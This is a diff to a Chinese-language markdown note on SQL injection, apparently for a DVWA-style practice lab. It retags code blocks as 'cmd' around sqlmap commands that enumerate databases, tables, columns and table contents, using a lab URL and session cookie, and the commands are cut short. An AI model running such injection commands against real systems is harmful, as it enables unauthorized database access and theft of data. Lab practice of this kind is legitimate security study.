@@ -1,6 +1,6 @@
 ### 查找
 
-```
+```cmd
 C:\Python33\sqlmap1.5.4>python sqlmap.py \
  -u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
@@ -9,7 +9,7 @@ C:\Python33\sqlmap1.5.4>python sqlmap.py \
 
 ### 查看数据库
 
-```
+```cmd
 C:\Python33\sqlmap1.5.4>python sqlmap.py 
 	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
 	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe" \
@@ -19,7 +19,7 @@ C:\Python33\sqlmap1.5.4>python sqlmap.py
 
 ### 查看指定数据库中的表
 
-```
+```cmd
 C:\Python33\sqlmap1.5.4>python sqlmap.py \
 	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
 	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
@@ -30,7 +30,7 @@ C:\Python33\sqlmap1.5.4>python sqlmap.py \
 
 ### 查看表结构
 
-```
+```cmd
 C:\Python33\sqlmap1.5.4>python sqlmap.py \
 	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
 	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
@@ -42,7 +42,7 @@ C:\Python33\sqlmap1.5.4>python sqlmap.py \
 
 ### 查看表内容
 
-```
+```cmd
 C:\Python33\sqlmap1.5.4>python sqlmap.py \
 	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
 	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
